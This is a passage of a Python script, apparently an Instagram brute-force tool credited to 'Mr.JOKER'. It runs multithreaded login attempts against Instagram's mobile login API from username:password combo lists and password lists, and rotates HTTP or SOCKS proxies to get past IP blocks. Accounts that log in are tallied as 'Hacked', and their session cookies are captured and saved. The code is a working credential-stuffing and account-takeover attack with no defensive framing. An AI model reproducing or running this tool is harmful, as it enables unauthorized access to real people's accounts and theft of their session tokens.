					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,self.pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(user,self.pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else: 
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		"""Function to run multiple threads for logging user information.
		Parameters:
		- self (object): Instance of the class.
		Returns:
		- None: No return value.
		Processing Logic:
		- Create a list to store threads.
		- Loop through the number of threads specified.
		- Create a thread object and start it.
		- Append the thread object to the list.
		- Loop through the list of threads and join them to the main thread."""
		
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_ComboList:
	def __init__(self):
		""""""
		
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		self.c = input('[$] Enter name file combo : ')
		try:self.file = open(self.c, 'r')
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_Combo(self):
		""""""
		
		while True:
			list = self.file.readline().split('\n')[0]
			if (user := list.split(':')[0])=='':
				threading.Thread(target=Exit).start()
				exit()
			try:pess = list.split(':')[1]
			except IndexError:pass
			else:
				proxylist = []
				for pro in self.proxy:
					proxylist.append(pro)
					run = str(random.choice(proxylist))
				try:
					if self.modPRX==1:
						PROXY = {
							"http": f"http://{run}",
							"https": f"http://{run}"}
					elif self.modPRX==2:
						PROXY = {
							"socks4": f"socks4://{run}",
							"socks5": f"socks5://{run}"}
					get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
					if login in get.text:
						self.hack+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						coke = get.cookies
						try:
							sisn = get.cookies['sessionid']
							threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
						except KeyError:
							threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
					elif errorPas in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif 'unusable_password' in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errorNam in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif band_use in get.text:
						self.ban+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
					elif secure in get.text:
						self.secur+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						threading.Thread(target=All_Seve.SeveScour(user,pess)).start()
					elif 'ip_block' in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errorFUOt in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif withs in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errReq in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif none in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					else:
						self.nones+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				except requests.exceptions.ConnectionError:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				except KeyboardInterrupt:Exit()
				except requests.exceptions.ReadTimeout:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_Combo)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
if __name__ == '__main__':
	mode=input(f"""
     {Blou} _____            _        ______                  {red} _____ _____ 
     {Blou}| ___ \          | |       |  ___|                 {red}|_   _|  __ \\
     {Blou}| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___    {red}| | | |  \/
     {Blou}| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \   {red}| | | | __ 
     {Blou}| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/  {red}_{red}| |_| |_\ \\
     {Blou}\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___| {red} \___/ \____/
                           BY Mr.JOKER @221298 {wit}


- 1 ) Guess by combo list (username:password)
- 2 ) Guess by password list(random username)
- 3 ) Guess by password list(target username)
- 4 ) Guess with one password (random username)
- 5 ) Auto Guess (random username and password)
- 6 ) Exit(0)

[$] Entser: """)
	if mode =='1':hacker_instagram_ComboList()
	elif mode=='2':hacker_instagram_randomUser_passLiest()
	elif mode=='3':hacker_instagram_1Target_passLiest()
	elif mode=='4':hacker_instagram_Rnadom_username()
	elif mode=='5':hacker_instagram_Check_automatic()
	else:Exit()
